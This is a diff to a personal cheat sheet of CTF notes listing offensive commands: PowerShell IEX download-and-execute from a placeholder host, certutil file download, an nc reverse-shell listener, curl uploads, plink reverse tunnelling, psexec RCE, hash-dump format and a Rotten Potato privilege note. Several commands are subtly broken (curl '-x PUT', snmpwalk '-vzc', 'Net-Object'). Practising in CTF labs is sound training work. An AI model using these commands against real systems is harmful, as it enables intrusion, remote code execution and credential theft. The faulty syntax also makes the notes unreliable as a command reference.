@@ -15,6 +15,16 @@ notes gathered from doing numerous CTFs to help with further CTFs
 <p> - impacket tools location on kali
 <p> /usr/share/doc/python3-impacket/examples/
 <p> use evilwinrm for when you have winrm access and want RCE
+<p> - upload file using curl
+<p> curl -x PUT http://[ip]:[port]/[payload] -d @[file]
+<p> - move files using CURL
+<p> curl -x MOVE -H 'Destination:http://[ip]/[file]' http://[ip]/[file]
+<p> - check SNMP info of target
+<p> snmpwalk -c public -vzc [ip]
+<p> - SNMP enum script
+<p> snmp-check
+<p> add functionality to reverse shell
+<p> rlwrap nc -lvnp [port]
 
 <p> -----------------------------------------------------------------------------------------
 </p>
@@ -38,7 +48,7 @@ notes gathered from doing numerous CTFs to help with further CTFs
 <p> > lookupsids [copied SID and incremen the last octet by one for user enumeration]
 <p> > e.g. SID: administrator s-1-5-21-4254423774-1266059056-3197185112-500 [last octet = 500, users are 1000+]
 <p> 
-
+<p>
 <p> -----------------------------------------------------------------------------------------
 <p> - file upload (works with powershell and linux):
 <p> curl http://[ip]:[port]/[file] -output [file]
@@ -85,26 +95,35 @@ notes gathered from doing numerous CTFs to help with further CTFs
 
 Windows:
 
+<p> Rotten potato exploit:
+<p> SeImpersonatePriviledge = enabled
+
 <p> windows powershell locations:
 <p> c:\Windows\System32\    - 32 bit
 <p> c:\Windows\SysWow64\    - 32 bit
 <p> c:\Windows\SysNative\   - 64 bit
-<p> sysinternals:
-<p> dump process using the ID given from Get-Process command
+<p> - windows hash dump structure:
+<p> [user]:[user no]:[lm hash]:[nt hash]:::
+  
+<p> - remote ssh:
+<p> plink.exe -l [user on loal machine] -pw [password] -L [10.10.10.15]:[port]:10.10.14.14:[port] -N [10.10.14.14]
+<p> [open ssh on kali machine for reverse tunnel]
+<p> - sysinternals:
+<p> - dump process using the ID given from Get-Process command
 <p> .\procdump64.exe
 <p> - if you have write access to SMB shares use this for RCE
 <p> psexec.py [user]@[ip]
 <p> - get current running processes using powershell:
 <p> powershell Get-Process
-File download:
-cmd.exe
-- certutil -urlcache -f http://<ip>:<port>/<file> <file output>
+<p> 
+<p> File download:
+<p> cmd.exe
+<p> - certutil -urlcache -f http://<ip>:<port>/<file> <file output>
 
 powershell:
 - file upload (will auto run any .ps1 scripts): 
 powershell IEX(New-Object Net.WebClient).downloadString("http://<ip>:<port>/<file>")
 - using powershell directly causes reverse shell crash:
 echo 'IEX(Net-Object Net.WebClient).downloadString("http://<ip>:<port>/<file>")' | powershell -noprofile - 
-  
 
 
